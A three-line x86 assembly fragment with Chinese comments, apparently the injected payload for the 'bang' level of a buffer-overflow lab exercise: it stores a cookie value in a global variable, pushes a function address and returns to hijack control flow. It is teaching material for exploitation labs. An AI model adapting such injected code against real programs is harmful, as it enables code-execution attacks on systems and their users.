movl $0x4da06a04, 0x804c218 /* 将cookie赋值给全局变量 */
push $0x08048d05            /* bang函数地址压栈 */
ret
